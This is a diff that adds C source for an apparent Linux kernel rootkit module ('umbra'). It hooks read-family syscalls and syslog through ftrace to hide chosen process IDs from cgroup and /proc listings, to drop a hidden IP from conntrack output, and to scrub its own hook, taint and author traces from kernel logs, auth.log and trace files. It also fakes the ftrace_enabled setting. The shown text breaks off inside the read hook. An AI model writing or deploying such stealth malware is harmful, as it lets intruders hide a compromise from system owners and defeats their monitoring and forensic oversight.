@@ -1,0 +1,1885 @@
+#include "../include/ub_core.h"
+#include "../ftrace/hook_engine.h"
+#include "../include/clear_taint_dmesg.h"
+#include "../include/veiled_pids.h"
+
+extern char saved_ftrace_value[64];
+extern bool ftrace_write_intercepted;
+
+#define MAX_CAP (1024*1024)
+#define MIN_KERNEL_READ 256
+
+#define SYSLOG_ACTION_READ       2
+#define SYSLOG_ACTION_READ_ALL   3
+#define SYSLOG_ACTION_READ_CLEAR 4
+
+static DEFINE_SPINLOCK(ftrace_read_lock);
+static unsigned long last_ftrace_read_jiffies = 0;
+
+static __be32 hidden_conntrack_ip;
+
+static const char *virtual_fs_types[] = {
+    "proc", "procfs", "sysfs", "tracefs", "debugfs", NULL
+};
+
+static asmlinkage ssize_t (*ub_real_read)(const struct pt_regs *regs);
+static asmlinkage ssize_t (*ub_real_read_ia32)(const struct pt_regs *regs);
+static asmlinkage ssize_t (*ub_real_pread64)(const struct pt_regs *regs);
+static asmlinkage ssize_t (*ub_real_pread64_ia32)(const struct pt_regs *regs);
+static asmlinkage ssize_t (*ub_real_preadv)(const struct pt_regs *regs);
+static asmlinkage ssize_t (*ub_real_preadv_ia32)(const struct pt_regs *regs);
+static asmlinkage ssize_t (*ub_real_readv)(const struct pt_regs *regs);
+static asmlinkage ssize_t (*ub_real_readv_ia32)(const struct pt_regs *regs);
+static int (*ub_real_sched_debug_show)(struct seq_file *m, void *v);
+static int (*ub_real_do_syslog)(int type, char __user *buf, int len, int source);
+
+notrace static bool line_contains_sensitive_info(const char *line);
+
+static notrace bool is_ftrace_fake_disabled(void)
+{
+    if (ftrace_write_intercepted && saved_ftrace_value[0] == '0')
+        return true;
+    return false;
+}
+
+static notrace bool is_cgroup_pid_file(struct file *file)
+{
+    const char *name;
+    struct super_block *sb;
+    
+    if (!file || !file->f_path.dentry)
+        return false;
+    
+    name = file->f_path.dentry->d_name.name;
+    if (!name)
+        return false;
+    
+    if (strcmp(name, "cgroup.procs") != 0 &&
+        strcmp(name, "tasks") != 0 &&
+        strcmp(name, "cgroup.threads") != 0)
+        return false;
+    
+    if (!file->f_path.mnt || !file->f_path.mnt->mnt_sb)
+        return false;
+    
+    sb = file->f_path.mnt->mnt_sb;
+    if (!sb->s_type || !sb->s_type->name)
+        return false;
+    
+    if (strcmp(sb->s_type->name, "cgroup") != 0 &&
+        strcmp(sb->s_type->name, "cgroup2") != 0)
+        return false;
+    
+    return true;
+}
+
+static notrace bool is_pid_hidden(pid_t pid)
+{
+    return ub_is_veiled((int)pid) || ub_is_offspring((int)pid);
+}
+
+static notrace ssize_t filter_hidden_pids_from_buffer(char *buf, ssize_t len)
+{
+    char *out;
+    ssize_t out_len = 0;
+    ssize_t i = 0;
+    
+    if (!buf || len <= 0)
+        return len;
+
+    if (ub_veiled_count <= 0 && ub_offspring_count <= 0)
+        return len;
+
+    out = kmalloc(len + 1, GFP_ATOMIC);
+    if (!out)
+        return len;
+    
+    while (i < len) {
+        ssize_t line_start = i;
+        ssize_t line_end;
+        pid_t pid = 0;
+        bool skip_line = false;
+        ssize_t j;
+        
+        while (i < len && buf[i] != '\n')
+            i++;
+        
+        line_end = i;
+        
+        if (i < len && buf[i] == '\n')
+            i++;
+        
+        j = line_start;
+        while (j < line_end && buf[j] >= '0' && buf[j] <= '9') {
+            pid = pid * 10 + (buf[j] - '0');
+            j++;
+        }
+        
+        if (pid > 0 && is_pid_hidden(pid))
+            skip_line = true;
+        
+        if (!skip_line) {
+            ssize_t line_len = i - line_start;
+            if (line_len > 0) {
+                memcpy(out + out_len, buf + line_start, line_len);
+                out_len += line_len;
+            }
+        }
+    }
+    
+    if (out_len > 0) {
+        memcpy(buf, out, out_len);
+    }
+    
+    kfree(out);
+    return out_len;
+}
+
+static notrace ssize_t filter_cgroup_pids(char __user *user_buf, ssize_t bytes_read)
+{
+    char *kernel_buf;
+    ssize_t filtered_len;
+    
+    if (bytes_read <= 0 || !user_buf)
+        return bytes_read;
+    
+    if (ub_veiled_count <= 0 && ub_offspring_count <= 0)
+        return bytes_read;
+    
+    kernel_buf = kmalloc(bytes_read + 1, GFP_ATOMIC);
+    if (!kernel_buf)
+        return bytes_read;
+    
+    if (copy_from_user(kernel_buf, user_buf, bytes_read)) {
+        kfree(kernel_buf);
+        return bytes_read;
+    }
+    kernel_buf[bytes_read] = '\0';
+    
+    filtered_len = filter_hidden_pids_from_buffer(kernel_buf, bytes_read);
+    
+    if (filtered_len != bytes_read) {
+        if (copy_to_user(user_buf, kernel_buf, filtered_len)) {
+            kfree(kernel_buf);
+            return bytes_read;
+        }
+    }
+    
+    kfree(kernel_buf);
+    return filtered_len;
+}
+
+static notrace bool is_real_ftrace_enabled(struct file *file)
+{
+    const char *name = NULL;
+    struct dentry *dentry, *parent;
+    struct super_block *sb;
+    
+    if (!file || !file->f_path.dentry)
+        return false;
+    
+    dentry = file->f_path.dentry;
+    if (dentry->d_name.name)
+        name = dentry->d_name.name;
+    
+    if (!name || strcmp(name, "ftrace_enabled") != 0)
+        return false;
+    
+    if (!file->f_path.mnt || !file->f_path.mnt->mnt_sb)
+        return false;
+    
+    sb = file->f_path.mnt->mnt_sb;
+    if (!sb->s_type || !sb->s_type->name)
+        return false;
+    
+    if (strcmp(sb->s_type->name, "proc") != 0 && 
+        strcmp(sb->s_type->name, "sysfs") != 0)
+        return false;
+    
+    parent = dentry->d_parent;
+    if (!parent || !parent->d_name.name || strcmp(parent->d_name.name, "kernel") != 0)
+        return false;
+    
+    parent = parent->d_parent;
+    if (!parent || !parent->d_name.name || strcmp(parent->d_name.name, "sys") != 0)
+        return false;
+    
+    return true;
+}
+
+static notrace bool is_trace_file(struct file *file)
+{
+    const char *name;
+    struct dentry *dentry;
+    struct super_block *sb;
+    
+    if (!file || !file->f_path.dentry)
+        return false;
+    
+    dentry = file->f_path.dentry;
+    name = dentry->d_name.name;
+    
+    if (!name || strcmp(name, "trace") != 0)
+        return false;
+    
+    if (!file->f_path.mnt || !file->f_path.mnt->mnt_sb)
+        return false;
+    
+    sb = file->f_path.mnt->mnt_sb;
+    if (!sb->s_type || !sb->s_type->name)
+        return false;
+    
+    return (strcmp(sb->s_type->name, "tracefs") == 0 || 
+            strcmp(sb->s_type->name, "debugfs") == 0);
+}
+
+static notrace bool is_trace_pipe_file(struct file *file)
+{
+    const char *name;
+    struct dentry *dentry;
+    struct super_block *sb;
+    
+    if (!file || !file->f_path.dentry)
+        return false;
+    
+    dentry = file->f_path.dentry;
+    name = dentry->d_name.name;
+    
+    if (!name || strcmp(name, "trace_pipe") != 0)
+        return false;
+    
+    if (!file->f_path.mnt || !file->f_path.mnt->mnt_sb)
+        return false;
+    
+    sb = file->f_path.mnt->mnt_sb;
+    if (!sb->s_type || !sb->s_type->name)
+        return false;
+    
+    return (strcmp(sb->s_type->name, "tracefs") == 0 || 
+            strcmp(sb->s_type->name, "debugfs") == 0);
+}
+
+static notrace bool is_enabled_functions_file(struct file *file)
+{
+    const char *name;
+    struct dentry *dentry;
+    struct super_block *sb;
+    
+    if (!file || !file->f_path.dentry)
+        return false;
+    
+    dentry = file->f_path.dentry;
+    name = dentry->d_name.name;
+    
+    if (!name || strcmp(name, "enabled_functions") != 0)
+        return false;
+    
+    if (!file->f_path.mnt || !file->f_path.mnt->mnt_sb)
+        return false;
+    
+    sb = file->f_path.mnt->mnt_sb;
+    if (!sb->s_type || !sb->s_type->name)
+        return false;
+    
+    return (strcmp(sb->s_type->name, "tracefs") == 0 || 
+            strcmp(sb->s_type->name, "debugfs") == 0);
+}
+
+static notrace bool is_touched_functions_file(struct file *file)
+{
+    const char *name;
+    struct dentry *dentry;
+    struct super_block *sb;
+    
+    if (!file || !file->f_path.dentry)
+        return false;
+    
+    dentry = file->f_path.dentry;
+    name = dentry->d_name.name;
+    
+    if (!name || strcmp(name, "touched_functions") != 0)
+        return false;
+    
+    if (!file->f_path.mnt || !file->f_path.mnt->mnt_sb)
+        return false;
+    
+    sb = file->f_path.mnt->mnt_sb;
+    if (!sb->s_type || !sb->s_type->name)
+        return false;
+    
+    return (strcmp(sb->s_type->name, "tracefs") == 0 || 
+            strcmp(sb->s_type->name, "debugfs") == 0);
+}
+
+static notrace bool is_proc_children_file(struct file *file)
+{
+    struct dentry *dentry, *parent;
+    const char *name;
+
+    if (!file || !file->f_path.dentry)
+        return false;
+
+    dentry = file->f_path.dentry;
+    name = dentry->d_name.name;
+    if (!name || strcmp(name, "children") != 0)
+        return false;
+
+    parent = dentry->d_parent;
+    if (!parent || !parent->d_name.name)
+        return false;
+    {
+        const char *p = parent->d_name.name;
+        if (!(*p >= '0' && *p <= '9'))
+            return false;
+    }
+
+    parent = parent->d_parent;
+    if (!parent || !parent->d_name.name)
+        return false;
+    if (strcmp(parent->d_name.name, "task") != 0)
+        return false;
+
+    return true;
+}
+
+static notrace ssize_t filter_proc_children_pids(char __user *user_buf, ssize_t bytes_read)
+{
+    char *kernel_buf, *out_buf;
+    ssize_t out_len = 0;
+    char *p, tok[16];
+    int tok_len, pid;
+
+    if (bytes_read <= 0 || !user_buf)
+        return bytes_read;
+
+    kernel_buf = kmalloc(bytes_read + 1, GFP_ATOMIC);
+    if (!kernel_buf)
+        return bytes_read;
+
+    if (copy_from_user(kernel_buf, user_buf, bytes_read)) {
+        kfree(kernel_buf);
+        return bytes_read;
+    }
+    kernel_buf[bytes_read] = '\0';
+
+    out_buf = kzalloc(bytes_read + 1, GFP_ATOMIC);
+    if (!out_buf) {
+        kfree(kernel_buf);
+        return bytes_read;
+    }
+
+    p = kernel_buf;
+    while (*p) {
+        while (*p == ' ' || *p == '\t' || *p == '\n' || *p == '\r')
+            p++;
+        if (*p == '\0')
+            break;
+
+        tok_len = 0;
+        while (*p >= '0' && *p <= '9' && tok_len < (int)sizeof(tok) - 1)
+            tok[tok_len++] = *p++;
+        tok[tok_len] = '\0';
+
+        if (tok_len == 0)
+            break;
+
+        if (kstrtoint(tok, 10, &pid) == 0 &&
+            !is_pid_hidden(pid) && !ub_is_offspring(pid) && !ub_pid_is_thread(pid)) {
+            if (out_len > 0)
+                out_buf[out_len++] = ' ';
+            out_len += snprintf(out_buf + out_len,
+                                bytes_read + 1 - out_len, "%d", pid);
+        }
+    }
+
+    if (out_len > 0 && out_len < bytes_read)
+        out_buf[out_len++] = '\n';
+
+    if (clear_user(user_buf, bytes_read)) {
+        kfree(kernel_buf);
+        kfree(out_buf);
+        return bytes_read;
+    }
+
+    if (out_len > 0 && copy_to_user(user_buf, out_buf, out_len)) {
+        kfree(kernel_buf);
+        kfree(out_buf);
+        return bytes_read;
+    }
+
+    kfree(kernel_buf);
+    kfree(out_buf);
+    return out_len;
+}
+
+static notrace bool is_procfs_file(struct file *file)
+{
+    struct super_block *sb;
+
+    if (!file || !file->f_path.mnt || !file->f_path.mnt->mnt_sb)
+        return false;
+    sb = file->f_path.mnt->mnt_sb;
+    return sb->s_type && sb->s_type->name &&
+           strcmp(sb->s_type->name, "proc") == 0;
+}
+
+static notrace ssize_t filter_proc_json_tasks(char __user *user_buf, ssize_t bytes_read)
+{
+    char *buf;
+    ssize_t new_len;
+    int i;
+    int snap[UB_MAX_VEILED_PIDS];
+    int snap_count;
+
+    if (bytes_read <= 0 || !user_buf)
+        return bytes_read;
+
+    snap_count = ub_veiled_pids_snapshot(snap, UB_MAX_VEILED_PIDS);
+    if (snap_count <= 0)
+        return bytes_read;
+
+    if (bytes_read > MAX_CAP)
+        bytes_read = MAX_CAP;
+
+    buf = kvmalloc(bytes_read + 1, GFP_KERNEL);
+    if (!buf)
+        return bytes_read;
+
+    if (copy_from_user(buf, user_buf, bytes_read)) {
+        kvfree(buf);
+        return bytes_read;
+    }
+    buf[bytes_read] = '\0';
+    new_len = bytes_read;
+
+    for (i = 0; i < snap_count; i++) {
+        char needle[32];
+        int  needle_len;
+        char *p, *end;
+
+        needle_len = snprintf(needle, sizeof(needle), "{\"pid\":%d,", snap[i]);
+        if (needle_len <= 0 || needle_len >= (int)sizeof(needle))
+            continue;
+
+        p   = buf;
+        end = buf + new_len;
+
+        while (p < end) {
+            char   *match = NULL;
+            char   *obj_end;
+            size_t  j, remaining;
+
+            remaining = (size_t)(end - p);
+            for (j = 0; j + (size_t)needle_len <= remaining; j++) {
+                if (memcmp(p + j, needle, needle_len) == 0) {
+                    match = p + j;
+                    break;
+                }
+            }
+            if (!match)
+                break;
+
+            obj_end = match + needle_len;
+            while (obj_end < end && *obj_end != '}')
+                obj_end++;
+            if (obj_end >= end)
+                break;
+            obj_end++;
+
+            {
+                char   *rm_start = match;
+                char   *rm_end   = obj_end;
+                size_t  tail;
+
+                if (rm_start > buf && *(rm_start - 1) == ',')
+                    rm_start--;
+                else if (rm_end < end && *rm_end == ',')
+                    rm_end++;
+
+                tail     = (size_t)(end - rm_end);
+                memmove(rm_start, rm_end, tail);
+                new_len -= (ssize_t)(rm_end - rm_start);
+                end      = buf + new_len;
+                p        = rm_start;
+            }
+        }
+    }
+
+    if (new_len != bytes_read) {
+        if (copy_to_user(user_buf, buf, new_len)) {
+            kvfree(buf);
+            return bytes_read;
+        }
+    }
+
+    kvfree(buf);
+    return new_len;
+}
+
+static notrace bool is_nf_conntrack_file(struct file *file)
+{
+    const char *name;
+    struct dentry *dentry, *parent;
+    
+    if (!file || !file->f_path.dentry)
+        return false;
+    
+    if (strncmp(current->comm, "conntrack", 9) == 0)
+        return false;
+    
+    dentry = file->f_path.dentry;
+    name = dentry->d_name.name;
+    
+    if (!name || strcmp(name, "nf_conntrack") != 0)
+        return false;
+    
+    parent = dentry->d_parent;
+    if (!parent || !parent->d_name.name || strcmp(parent->d_name.name, "net") != 0)
+        return false;
+    
+    return true;
+}
+
+static notrace bool line_contains_hidden_ip(const char *line)
+{
+    char ip_str[20];
+    
+    if (!line)
+        return false;
+    
+    snprintf(ip_str, sizeof(ip_str), "%pI4", &hidden_conntrack_ip);
+    
+    return (strstr(line, ip_str) != NULL);
+}
+
+static notrace ssize_t filter_conntrack_output(char __user *user_buf, ssize_t bytes_read)
+{
+    char *kernel_buf, *filtered_buf, *line_start, *line_end;
+    size_t filtered_len = 0;
+    
+    if (bytes_read <= 0 || !user_buf)
+        return bytes_read;
+    
+    if (bytes_read > MAX_CAP)
+        bytes_read = MAX_CAP;
+
+    kernel_buf = kvmalloc(bytes_read + 1, GFP_KERNEL);
+    if (!kernel_buf)
+        return bytes_read;
+
+    if (copy_from_user(kernel_buf, user_buf, bytes_read)) {
+        kvfree(kernel_buf);
+        return bytes_read;
+    }
+    kernel_buf[bytes_read] = '\0';
+
+    filtered_buf = kvzalloc(bytes_read + 1, GFP_KERNEL);
+    if (!filtered_buf) {
+        kvfree(kernel_buf);
+        return bytes_read;
+    }
+
+    line_start = kernel_buf;
+    while ((line_end = strchr(line_start, '\n'))) {
+        size_t line_len = line_end - line_start;
+        char saved = *line_end;
+        *line_end = '\0';
+        
+        if (!line_contains_hidden_ip(line_start)) {
+            if (filtered_len + line_len + 1 <= bytes_read) {
+                memcpy(filtered_buf + filtered_len, line_start, line_len);
+                filtered_len += line_len;
+                filtered_buf[filtered_len++] = '\n';
+            }
+        }
+        
+        *line_end = saved;
+        line_start = line_end + 1;
+    }
+
+    if (*line_start && !line_contains_hidden_ip(line_start)) {
+        size_t remaining = strlen(line_start);
+        if (filtered_len + remaining <= bytes_read) {
+            memcpy(filtered_buf + filtered_len, line_start, remaining);
+            filtered_len += remaining;
+        }
+    }
+
+    if (filtered_len == 0) {
+        kvfree(kernel_buf);
+        kvfree(filtered_buf);
+        return 0;
+    }
+
+    if (copy_to_user(user_buf, filtered_buf, filtered_len)) {
+        kvfree(kernel_buf);
+        kvfree(filtered_buf);
+        return bytes_read;
+    }
+
+    kvfree(kernel_buf);
+    kvfree(filtered_buf);
+    return filtered_len;
+}
+
+static notrace ssize_t filter_trace_output(char __user *user_buf, ssize_t bytes_read)
+{
+    static char frozen_header[4096] = {0};
+    static size_t frozen_header_len = 0;
+    static bool header_initialized = false;
+    char *kernel_buf, *filtered_buf, *line_start, *line_end;
+    size_t filtered_len = 0;
+    bool ftrace_disabled;
+    
+    if (bytes_read <= 0 || !user_buf)
+        return bytes_read;
+
+    ftrace_disabled = is_ftrace_fake_disabled();
+
+    if (!ftrace_disabled) {
+        header_initialized = false;
+        frozen_header_len = 0;
+        
+        if (bytes_read > MAX_CAP)
+            bytes_read = MAX_CAP;
+
+        kernel_buf = kvmalloc(bytes_read + 1, GFP_KERNEL);
+        if (!kernel_buf)
+            return bytes_read;
+
+        if (copy_from_user(kernel_buf, user_buf, bytes_read)) {
+            kvfree(kernel_buf);
+            return bytes_read;
+        }
+        kernel_buf[bytes_read] = '\0';
+
+        filtered_buf = kvzalloc(bytes_read + 1, GFP_KERNEL);
+        if (!filtered_buf) {
+            kvfree(kernel_buf);
+            return bytes_read;
+        }
+
+        line_start = kernel_buf;
+        while ((line_end = strchr(line_start, '\n'))) {
+            size_t line_len = line_end - line_start;
+            char saved = *line_end;
+            *line_end = '\0';
+            
+            if (!line_contains_sensitive_info(line_start)) {
+                if (filtered_len + line_len + 1 <= bytes_read) {
+                    memcpy(filtered_buf + filtered_len, line_start, line_len);
+                    filtered_len += line_len;
+                    filtered_buf[filtered_len++] = '\n';
+                }
+            }
+            
+            *line_end = saved;
+            line_start = line_end + 1;
+        }
+
+        if (*line_start && !line_contains_sensitive_info(line_start)) {
+            size_t remaining = strlen(line_start);
+            if (filtered_len + remaining <= bytes_read) {
+                memcpy(filtered_buf + filtered_len, line_start, remaining);
+                filtered_len += remaining;
+            }
+        }
+
+        if (filtered_len == 0) {
+            kvfree(kernel_buf);
+            kvfree(filtered_buf);
+            return 0;
+        }
+
+        if (copy_to_user(user_buf, filtered_buf, filtered_len)) {
+            kvfree(kernel_buf);
+            kvfree(filtered_buf);
+            return -EFAULT;
+        }
+
+        kvfree(kernel_buf);
+        kvfree(filtered_buf);
+        return filtered_len;
+    }
+
+    if (bytes_read > MAX_CAP)
+        bytes_read = MAX_CAP;
+
+    if (!header_initialized) {
+        kernel_buf = kvmalloc(bytes_read + 1, GFP_KERNEL);
+        if (!kernel_buf)
+            return bytes_read;
+
+        if (copy_from_user(kernel_buf, user_buf, bytes_read)) {
+            kvfree(kernel_buf);
+            return bytes_read;
+        }
+        kernel_buf[bytes_read] = '\0';
+
+        frozen_header_len = 0;
+        line_start = kernel_buf;
+        while ((line_end = strchr(line_start, '\n'))) {
+            size_t line_len = line_end - line_start;
+            
+            if (line_len > 0 && line_start[0] == '#') {
+                if (frozen_header_len + line_len + 1 < sizeof(frozen_header)) {
+                    memcpy(frozen_header + frozen_header_len, line_start, line_len);
+                    frozen_header_len += line_len;
+                    frozen_header[frozen_header_len++] = '\n';
+                }
+            }
+            line_start = line_end + 1;
+        }
+
+        if (*line_start && line_start[0] == '#') {
+            size_t remaining = strlen(line_start);
+            if (frozen_header_len + remaining < sizeof(frozen_header)) {
+                memcpy(frozen_header + frozen_header_len, line_start, remaining);
+                frozen_header_len += remaining;
+            }
+        }
+
+        frozen_header[frozen_header_len] = '\0';
+        header_initialized = true;
+        kvfree(kernel_buf);
+    }
+
+    if (frozen_header_len == 0)
+        return 0;
+
+    if (copy_to_user(user_buf, frozen_header, frozen_header_len))
+        return -EFAULT;
+
+    return frozen_header_len;
+}
+
+static notrace ssize_t filter_trace_pipe_output(char __user *user_buf, ssize_t bytes_read)
+{
+    char *kernel_buf, *filtered_buf, *line_start, *line_end;
+    size_t filtered_len = 0;
+    
+    if (bytes_read <= 0 || !user_buf)
+        return bytes_read;
+    
+    if (bytes_read > MAX_CAP)
+        bytes_read = MAX_CAP;
+
+    kernel_buf = kvmalloc(bytes_read + 1, GFP_KERNEL);
+    if (!kernel_buf)
+        return bytes_read;
+
+    if (copy_from_user(kernel_buf, user_buf, bytes_read)) {
+        kvfree(kernel_buf);
+        return bytes_read;
+    }
+    kernel_buf[bytes_read] = '\0';
+
+    filtered_buf = kvzalloc(bytes_read + 1, GFP_KERNEL);
+    if (!filtered_buf) {
+        kvfree(kernel_buf);
+        return bytes_read;
+    }
+
+    line_start = kernel_buf;
+    while ((line_end = strchr(line_start, '\n'))) {
+        size_t line_len = line_end - line_start;
+        char saved = *line_end;
+        *line_end = '\0';
+        
+        if (!line_contains_sensitive_info(line_start)) {
+            if (filtered_len + line_len + 1 <= bytes_read) {
+                memcpy(filtered_buf + filtered_len, line_start, line_len);
+                filtered_len += line_len;
+                filtered_buf[filtered_len++] = '\n';
+            }
+        }
+        
+        *line_end = saved;
+        line_start = line_end + 1;
+    }
+
+    if (*line_start && !line_contains_sensitive_info(line_start)) {
+        size_t remaining = strlen(line_start);
+        if (filtered_len + remaining <= bytes_read) {
+            memcpy(filtered_buf + filtered_len, line_start, remaining);
+            filtered_len += remaining;
+        }
+    }
+
+    if (filtered_len == 0) {
+        kvfree(kernel_buf);
+        kvfree(filtered_buf);
+        return 0;
+    }
+
+    if (copy_to_user(user_buf, filtered_buf, filtered_len)) {
+        kvfree(kernel_buf);
+        kvfree(filtered_buf);
+        return -EFAULT;
+    }
+
+    kvfree(kernel_buf);
+    kvfree(filtered_buf);
+    return filtered_len;
+}
+
+notrace static bool should_filter_file(const char *filename) {
+    if (!filename)
+        return false;
+
+    return (strcmp(filename, "kmsg") == 0 || strcmp(filename, "kallsyms") == 0 ||
+            strcmp(filename, "enabled_functions") == 0 ||
+            strcmp(filename, "debug") == 0 || strcmp(filename, "trace") == 0 ||
+            strcmp(filename, "kern.log") == 0 || strcmp(filename, "kern.log.1") == 0 ||
+            strcmp(filename, "syslog") == 0 || strcmp(filename, "auth.log") == 0 ||
+            strcmp(filename, "auth.log.1") == 0 || strcmp(filename, "vmallocinfo") == 0 ||
+            strcmp(filename, "syslog.1") == 0 || strcmp(filename, "trace_pipe") == 0 ||
+            strcmp(filename, "kcore") == 0 || strcmp(filename, "touched_functions") == 0);
+}
+
+notrace static bool is_kmsg_device(const char *filename) {
+    return filename && strcmp(filename, "kmsg") == 0;
+}
+
+static notrace bool line_has_our_trampoline(const char *line)
+{
+    const char *p;
+    unsigned long addr = 0;
+    char c;
+
+    p = strstr(line, "tramp: 0x");
+    if (!p)
+        return false;
+    p = strstr(p, " (0x");
+    if (!p)
+        return false;
+    p += 4;
+
+    while ((c = *p++)) {
+        if      (c >= '0' && c <= '9') addr = (addr << 4) | (unsigned long)(c - '0');
+        else if (c >= 'a' && c <= 'f') addr = (addr << 4) | (unsigned long)(c - 'a' + 10);
+        else if (c >= 'A' && c <= 'F') addr = (addr << 4) | (unsigned long)(c - 'A' + 10);
+        else break;
+    }
+
+    return addr && within_module(addr, THIS_MODULE);
+}
+
+notrace static bool line_contains_sensitive_info(const char *line)
+{
+    const char *p;
+
+    if (!line)
+        return false;
+
+    if (line_has_our_trampoline(line))
+        return true;
+
+    for (p = line; *p; p++) {
+        switch (*p) {
+
+        case '_':
+            if (strncmp(p, "__builtin__ftrace", 17) == 0) return true;
+            break;
+
+        case 'c':
+            if (strncmp(p, "create_trampoline+", 18) == 0) return true;
+            if (strncmp(p, "constprop", 9) == 0) return true;
+            if (strncmp(p, "clear_taint", 11) == 0) return true;
+
+            if (strncmp(p, "called before initial load_policy", 33) == 0)
+                return true;
+            break;
+
+        case 'h':
+            if (strncmp(p, "hook", 4) == 0) return true;
+            break;
+
+       // case 'j':
+         //   if (strncmp(p, "journal", 7) == 0) return true;
+           // break;
+
+        case 't':
+            if (strncmp(p, "taint", 5) == 0) return true;
+            if (strncmp(p, "tcp4_seq_show", 13) == 0) return true;
+            if (strncmp(p, "tcp6_seq_show", 13) == 0) return true;
+            if (strncmp(p, "tpacket_rcv", 11) == 0) return true;
+            break;
+
+        case 's':
+            if (strncmp(p, "umbra", 11) == 0) return true;
+
+            if (strncmp(p, "security_sid_to_context_core", 28) == 0)
+                return true;
+            break;
+
+        case 'S':
+            if (strncmp(p, "UMBRA", 11) == 0) return true;
+            break;
+
+        case 'u':
+            if (strncmp(p, "udp4_seq_show", 13) == 0) return true;
+            if (strncmp(p, "udp6_seq_show", 13) == 0) return true;
+            if (strncmp(p, "unrecognized netlink message", 28) == 0) return true;
+            if (strncmp(p, "unknown SID", 11) == 0) return true;
+            break;
+
+        case 'm':
+            if (strncmp(p, "matheuz", 7) == 0) return true;
+            break;
+
+        case 'z':
+            if (strncmp(p, "zer0t", 5) == 0) return true;
+            break;
+
+        case 'o':
+            if (strncmp(p, "obliviate", 9) == 0) return true;
+            break;
+
+        case 'k':
+            if (strncmp(p, "kallsyms_lookup_name", 20) == 0) return true;
+            break;
+
+        case 'f':
+            if (strncmp(p, "filter_kmsg", 11) == 0) return true;
+            if (strncmp(p, "ub_fh_install", 13) == 0) return true;
+            if (strncmp(p, "ub_fh_remove", 12) == 0) return true;
+            if (strncmp(p, "hook_engine", 12) == 0) return true;
+            break;
+        }
+    }
+
+    return false;
+}
+
+
+
+notrace static bool __attribute__((unused)) is_virtual_file(struct file *file) {
+    const char *fsname;
+    int i;
+    if (!file || !file->f_path.mnt || !file->f_path.mnt->mnt_sb || !file->f_path.mnt->mnt_sb->s_type)
+        return false;
+    fsname = file->f_path.mnt->mnt_sb->s_type->name;
+    if (!fsname)
+        return false;
+    for (i = 0; virtual_fs_types[i]; i++) {
+        if (strcmp(fsname, virtual_fs_types[i]) == 0)
+            return true;
+    }
+    return false;
+}
+
+notrace static ssize_t filter_buffer_content(char __user *user_buf, ssize_t bytes_read) {
+    char *kernel_buf, *total_buf, *filtered_buf, *line_start, *line_end;
+    size_t filtered_len = 0, total_len;
+    
+    if (bytes_read <= 0 || !user_buf)
+        return bytes_read;
+    if (bytes_read > MAX_CAP)
+        bytes_read = MAX_CAP;
+
+    kernel_buf = kvmalloc(bytes_read + 1, GFP_KERNEL);
+    if (!kernel_buf)
+        return -ENOMEM;
+    if (copy_from_user(kernel_buf, user_buf, bytes_read)) {
+        kvfree(kernel_buf);
+        return -EFAULT;
+    }
+    kernel_buf[bytes_read] = '\0';
+
+    total_len = bytes_read;
+    total_buf = kvmalloc(total_len + 1, GFP_KERNEL);
+    if (!total_buf) {
+        kvfree(kernel_buf);
+        return -ENOMEM;
+    }
+    memcpy(total_buf, kernel_buf, bytes_read);
+    total_buf[total_len] = '\0';
+
+    filtered_buf = kvzalloc(total_len + 1, GFP_KERNEL);
+    if (!filtered_buf) {
+        kvfree(kernel_buf);
+        kvfree(total_buf);
+        return -ENOMEM;
+    }
+
+    line_start = total_buf;
+    while ((line_end = strchr(line_start, '\n'))) {
+        size_t line_len = line_end - line_start;
+        char saved = line_end[0];
+        line_end[0] = '\0';
+        if (!line_contains_sensitive_info(line_start)) {
+            if (filtered_len + line_len + 1 <= total_len) {
+                memcpy(filtered_buf + filtered_len, line_start, line_len);
+                filtered_len += line_len;
+                filtered_buf[filtered_len++] = '\n';
+            }
+        }
+        line_end[0] = saved;
+        line_start = line_end + 1;
+    }
+
+    if (filtered_len == 0) {
+        kvfree(kernel_buf);
+        kvfree(total_buf);
+        kvfree(filtered_buf);
+        return 0;
+    }
+
+    if (copy_to_user(user_buf, filtered_buf, filtered_len)) {
+        kvfree(kernel_buf);
+        kvfree(total_buf);
+        kvfree(filtered_buf);
+        return -EFAULT;
+    }
+
+    kvfree(kernel_buf);
+    kvfree(total_buf);
+    kvfree(filtered_buf);
+    return filtered_len;
+}
+
+notrace static ssize_t filter_kmsg_line(char __user *user_buf, ssize_t bytes_read) {
+    char *kernel_buf;
+    ssize_t ret;
+    
+    if (bytes_read <= 0 || !user_buf)
+        return bytes_read;
+
+    kernel_buf = kmalloc(bytes_read + 1, GFP_KERNEL);
+    if (!kernel_buf)
+        return bytes_read;
+    if (copy_from_user(kernel_buf, user_buf, bytes_read)) {
+        kfree(kernel_buf);
+        return bytes_read;
+    }
+    kernel_buf[bytes_read] = '\0';
+    ret = line_contains_sensitive_info(kernel_buf) ? 0 : bytes_read;
+    kfree(kernel_buf);
+    return ret;
+}
+
+static notrace asmlinkage ssize_t ub_hook_read(const struct pt_regs *regs) {
+    struct file *file;
+    const char *filename;
+    bool is_kmsg, ftrace_disabled;
+    ssize_t res = 0, ub_real_res;
+    int fd;
+    char __user *user_buf;
+    size_t count;
+
+    if (!ub_real_read)
+        return -EINVAL;
+
+    fd = regs->di;
+    user_buf = (char __user *)regs->si;
+    count = (size_t)regs->dx;
+
+    if (!user_buf)
+        return -EFAULT;
+
+    if (ftrace_write_intercepted) {
+        struct file *check_file = fget(fd);
+        if (check_file) {
+            if (is_real_ftrace_enabled(check_file)) {
+                size_t fake_len = strlen(saved_ftrace_value);
+                unsigned long flags, now = jiffies;
+                bool should_return_data = false;
+                
+                spin_lock_irqsave(&ftrace_read_lock, flags);
+                if (time_after(now, last_ftrace_read_jiffies + msecs_to_jiffies(100))) {
+                    should_return_data = true;
+                    last_ftrace_read_jiffies = now;
+                }
+                spin_unlock_irqrestore(&ftrace_read_lock, flags);
+                
+                fput(check_file);
+                
+                if (!should_return_data)
+                    return 0;
+                
+                if (fake_len <= count) {
+                    if (!copy_to_user(user_buf, saved_ftrace_value, fake_len))
+                        return fake_len;
+                }
+                return -EFAULT;
+            }
+            fput(check_file);
+        }
+    }
+
+    file = fget(fd);
+    if (!file)
+        return ub_real_read(regs);
+
+    if (is_ftrace_fake_disabled()) {
+        if (is_enabled_functions_file(file) || is_touched_functions_file(file)) {
+            fput(file);
+            return 0;
+        }
+    }
+
+    if (is_cgroup_pid_file(file)) {
+        ub_real_res = ub_real_read(regs);
+        fput(file);
+        if (ub_real_res <= 0)
+            return ub_real_res;
+        return filter_cgroup_pids(user_buf, ub_real_res);
+    }
+
+    if (is_proc_children_file(file)) {
+        ub_real_res = ub_real_read(regs);
+        fput(file);
+        if (ub_real_res <= 0)
